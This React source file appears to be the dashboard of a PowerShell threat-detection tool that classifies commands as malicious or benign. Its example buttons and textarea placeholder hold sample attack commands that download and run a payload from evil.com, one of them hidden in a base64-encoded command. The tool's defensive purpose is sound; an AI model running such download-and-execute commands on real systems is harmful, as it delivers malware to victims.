import { useState } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import {
  Terminal, Shield, ShieldAlert, Activity, Clock,
  Zap, RotateCcw, ChevronRight, Cpu, Database
} from 'lucide-react'
import { analyzeCommand } from '../services/api'
import ResultCard from '../components/ResultCard'
import LoadingSpinner from '../components/LoadingSpinner'

const EXAMPLE_COMMANDS = [
  { label: '⚠ Download & Execute', color: 'red',
    command: `$wc = New-Object System.Net.WebClient\n$wc.DownloadFile('http://evil.com/payload.exe', 'C:\\Temp\\p.exe')\nStart-Process 'C:\\Temp\\p.exe'` },
  { label: '⚠ Encoded Payload', color: 'red',
    command: `powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AYwAuAHAAcwAxACcAKQA=` },
  { label: '✓ List Services', color: 'green',
    command: `Get-Service | Where-Object { $_.Status -eq 'Running' } | Sort-Object DisplayName` },
  { label: '✓ System Info', color: 'green',
    command: `Get-ComputerInfo | Select-Object CsName, OsName, OsVersion, CsProcessors` },
]

function StatBox({ icon: Icon, label, value, color, delay }) {
  const c = {
    cyan:   { text: 'text-cyan-400',   bg: 'bg-cyan-500/8',   border: 'border-cyan-500/20'   },
    red:    { text: 'text-red-400',    bg: 'bg-red-500/8',    border: 'border-red-500/20'    },
    green:  { text: 'text-green-400',  bg: 'bg-green-500/8',  border: 'border-green-500/20'  },
    purple: { text: 'text-purple-400', bg: 'bg-purple-500/8', border: 'border-purple-500/20' },
  }[color]

  return (
    <motion.div
      initial={{ opacity: 0, y: 16 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ delay, duration: 0.4 }}
      className={`p-5 rounded-2xl glass border ${c.border}`}
    >
      <div className={`inline-flex p-2 rounded-xl ${c.bg} border ${c.border} mb-3`}>
        <Icon className={`w-4 h-4 ${c.text}`} />
      </div>
      <p className="text-slate-500 text-xs uppercase tracking-widest font-bold mb-1">{label}</p>
      <p className={`font-display text-2xl font-black ${c.text}`}>{value}</p>
    </motion.div>
  )
}

export default function Dashboard() {
  const [command, setCommand]   = useState('')
  const [result, setResult]     = useState(null)
  const [loading, setLoading]   = useState(false)
  const [error, setError]       = useState(null)
  const [history, setHistory]   = useState([])

  async function handleAnalyze() {
    if (!command.trim()) return
    setLoading(true); setError(null); setResult(null)
    try {
      const data = await analyzeCommand(command)
      setResult(data)
      setHistory(prev => [
        { cmd: command.slice(0, 55) + (command.length > 55 ? '…' : ''), ...data, ts: new Date() },
        ...prev,
      ].slice(0, 6))
    } catch (err) {
      setError(err?.response?.data?.detail ?? err.message ?? 'Unknown error')
    } finally {
      setLoading(false)
    }
  }

  const overLimit = command.length > 50000

  return (
    <div className="min-h-screen bg-[#020817] grid-bg scanline pt-20 pb-16 px-4">
      <div className="max-w-7xl mx-auto space-y-6">

        {/* Header */}
        <motion.div
          initial={{ opacity: 0, y: -16 }}
          animate={{ opacity: 1, y: 0 }}
          className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3"
        >
          <div>
            <div className="flex items-center gap-3 mb-1">
              <div className="w-2 h-8 rounded-full bg-gradient-to-b from-cyan-400 to-purple-500" />
              <h1 className="font-display text-3xl font-black text-white">
                Detection <span className="gradient-text-cyber">Dashboard</span>
              </h1>
            </div>
            <p className="text-slate-500 text-sm ml-5 font-rajdhani">
              Submit any PowerShell command for AI-powered threat analysis
            </p>
          </div>

          <motion.div
            animate={{ opacity: [0.6, 1, 0.6] }}
            transition={{ duration: 2, repeat: Infinity }}
            className="flex items-center gap-2 px-4 py-2 rounded-xl glass border border-green-500/20 text-green-400 text-xs font-bold tracking-widest uppercase self-start sm:self-auto"
          >
            <span className="w-2 h-2 rounded-full bg-green-400 animate-pulse" />
            Model Online
          </motion.div>
        </motion.div>

        {/* Stats */}
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-4">
          <StatBox icon={Shield}      label="Total Scans"     value={history.length}                                          color="cyan"   delay={0}    />
          <StatBox icon={ShieldAlert} label="Threats Found"   value={history.filter(h => h.prediction === 'Malicious').length} color="red"    delay={0.06} />
          <StatBox icon={Activity}    label="Safe Commands"   value={history.filter(h => h.prediction === 'Benign').length}   color="green"  delay={0.12} />
          <StatBox icon={Zap}         label="Avg Confidence"
            value={history.length ? `${(history.reduce((a,h)=>a+h.confidence,0)/history.length).toFixed(1)}%` : '—'}
            color="purple" delay={0.18}
          />
        </div>

        {/* Main layout */}
        <div className="grid lg:grid-cols-2 gap-6">

          {/* ── INPUT PANEL ── */}
          <motion.div
            initial={{ opacity: 0, x: -20 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.5 }}
            className="glass-cyan rounded-2xl p-6 space-y-5"
          >
            {/* Panel title */}
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 rounded-lg bg-cyan-500/10 border border-cyan-500/25 flex items-center justify-center">
                <Terminal className="w-4 h-4 text-cyan-400" />
              </div>
              <div>
                <h2 className="font-display text-sm font-bold text-white tracking-wide">PowerShell Input</h2>
                <p className="text-slate-500 text-xs font-rajdhani">Paste command or script below</p>
              </div>
            </div>

            {/* Example buttons */}
            <div>
              <p className="text-xs text-slate-600 uppercase tracking-widest mb-2 font-bold">Quick Examples</p>
              <div className="flex flex-wrap gap-2">
                {EXAMPLE_COMMANDS.map((ex) => (
                  <button
                    key={ex.label}
                    onClick={() => { setCommand(ex.command); setResult(null); setError(null) }}
                    className={`px-3 py-1.5 text-xs rounded-lg border transition-all font-mono ${
                      ex.color === 'red'
                        ? 'bg-red-500/8 border-red-500/20 text-red-400 hover:border-red-500/40'
                        : 'bg-green-500/8 border-green-500/20 text-green-400 hover:border-green-500/40'
                    }`}
                  >
                    {ex.label}
                  </button>
                ))}
              </div>
            </div>

            {/* Textarea */}
            <div className="relative">
              <textarea
                value={command}
                onChange={e => setCommand(e.target.value)}
                placeholder="# Paste your PowerShell command or script here...&#10;&#10;# Example:&#10;$wc = New-Object System.Net.WebClient&#10;$wc.DownloadFile('http://evil.com/mal.exe', 'C:\Temp\mal.exe')"
                rows={13}
                className={`w-full rounded-xl px-4 py-3 text-sm text-slate-200 placeholder-slate-700 resize-none focus:outline-none transition-all font-mono
                  bg-[#020817] border ${overLimit ? 'border-red-500/50 focus:ring-1 focus:ring-red-500/30' : 'border-cyan-500/15 focus:border-cyan-500/40 focus:ring-1 focus:ring-cyan-500/20'}`}
              />
              <div className="absolute bottom-3 right-3 flex items-center gap-3">
                <span className={`text-xs font-mono ${overLimit ? 'text-red-400' : 'text-slate-600'}`}>
                  {command.length.toLocaleString()} / 50,000
                </span>
              </div>
            </div>

            {/* Action buttons */}
            <div className="flex gap-3">
              <motion.button
                whileHover={{ scale: 1.01 }}
                whileTap={{ scale: 0.97 }}
                onClick={handleAnalyze}
                disabled={loading || !command.trim() || overLimit}
                className="flex-1 flex items-center justify-center gap-2 py-3.5 rounded-xl font-bold tracking-wide transition-all btn-cyber disabled:opacity-30 disabled:cursor-not-allowed font-rajdhani text-base"
              >
                <Shield className="w-4 h-4" />
                {loading ? 'Analyzing...' : 'Analyze Command'}
                {!loading && <ChevronRight className="w-4 h-4" />}
              </motion.button>

              <motion.button
                whileTap={{ scale: 0.95 }}
                onClick={() => { setCommand(''); setResult(null); setError(null) }}
                title="Clear"
                className="px-4 py-3 rounded-xl glass border border-white/8 text-slate-500 hover:text-slate-300 hover:border-white/15 transition-all"
              >
                <RotateCcw className="w-4 h-4" />
              </motion.button>
            </div>

            {/* Model info strip */}
            <div className="flex items-center gap-4 pt-2 border-t border-white/5">
              {[
                { icon: Cpu,      label: 'Random Forest' },
                { icon: Database, label: 'TF-IDF Vectorizer' },
                { icon: Activity, label: 'Real-time API' },
              ].map(({ icon: Icon, label }) => (
                <div key={label} className="flex items-center gap-1.5 text-slate-600 text-xs">
                  <Icon className="w-3 h-3 text-cyan-500/60" />
                  {label}
                </div>
              ))}
            </div>
          </motion.div>

          {/* ── RESULT PANEL ── */}
          <div>
            <AnimatePresence mode="wait">
              {loading && (
                <motion.div key="loading" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
                  className="glass-cyan rounded-2xl p-4">
                  <LoadingSpinner />
                </motion.div>
              )}

              {error && !loading && (
                <motion.div key="error" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}
                  className="p-8 rounded-2xl glass border border-red-500/25">
                  <div className="flex items-center gap-3 mb-3">
                    <div className="w-10 h-10 rounded-xl bg-red-500/10 border border-red-500/25 flex items-center justify-center">
                      <ShieldAlert className="w-5 h-5 text-red-400" />
                    </div>
                    <p className="font-display text-base font-bold text-red-400">Analysis Failed</p>
                  </div>
                  <p className="text-slate-400 text-sm font-mono bg-black/20 px-4 py-3 rounded-xl">{error}</p>
                </motion.div>
              )}

              {result && !loading && (
                <motion.div key="result" initial={{ opacity: 0, scale: 0.97 }} animate={{ opacity: 1, scale: 1 }}>
                  <ResultCard result={result} />
                </motion.div>
              )}

              {!loading && !result && !error && (
                <motion.div key="empty" initial={{ opacity: 0 }} animate={{ opacity: 1 }}
                  className="glass rounded-2xl border border-white/5 p-12 flex flex-col items-center justify-center text-center gap-5 min-h-[380px]">
                  <motion.div
                    animate={{ y: [0, -10, 0], opacity: [0.4, 0.8, 0.4] }}
                    transition={{ duration: 4, repeat: Infinity }}
                    className="w-20 h-20 rounded-2xl bg-cyan-500/8 border border-cyan-500/15 flex items-center justify-center"
                  >
                    <Shield className="w-10 h-10 text-cyan-400/50" />
                  </motion.div>
                  <div>
                    <p className="font-display text-sm font-bold text-slate-600 uppercase tracking-widest mb-2">Awaiting Input</p>
                    <p className="text-slate-600 text-sm max-w-xs leading-relaxed font-rajdhani">
                      Paste a PowerShell command and click <span className="text-slate-500">Analyze Command</span> to see the AI verdict.
                    </p>
                  </div>
                  <div className="flex gap-2 mt-2">
                    {[0,1,2,3,4].map(i => (
                      <motion.div key={i}
                        animate={{ opacity: [0.2, 0.8, 0.2], scaleY: [0.5, 1, 0.5] }}
                        transition={{ duration: 1.2, repeat: Infinity, delay: i * 0.12 }}
                        className="w-1 h-6 rounded-full bg-cyan-500/30 origin-bottom"
                      />
                    ))}
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        </div>

        {/* ── HISTORY ── */}
        {history.length > 0 && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="glass rounded-2xl border border-white/5 p-6"
          >
            <div className="flex items-center gap-2 mb-5">
              <Clock className="w-4 h-4 text-slate-500" />
              <h3 className="font-display text-xs font-bold text-slate-500 uppercase tracking-widest">Recent Scans</h3>
            </div>
            <div className="space-y-2">
              {history.map((h, i) => (
                <motion.div
                  key={i}
                  initial={{ opacity: 0, x: -20 }}
                  animate={{ opacity: 1, x: 0 }}
                  transition={{ delay: i * 0.04 }}
                  className="flex items-center justify-between px-4 py-3 rounded-xl bg-white/2 border border-white/4 hover:border-white/8 transition-all"
                >
                  <span className="text-slate-500 text-xs font-mono truncate flex-1 mr-6">{h.cmd}</span>
                  <div className="flex items-center gap-3 flex-shrink-0">
                    <span className={`text-xs font-bold font-display ${h.prediction === 'Malicious' ? 'text-red-400' : 'text-green-400'}`}>
                      {h.prediction.toUpperCase()}
                    </span>
                    <span className="text-slate-600 text-xs font-mono">{h.confidence}%</span>
                    <span className="text-slate-700 text-xs">{h.ts.toLocaleTimeString()}</span>
                  </div>
                </motion.div>
              ))}
            </div>
          </motion.div>
        )}
      </div>
    </div>
  )
}
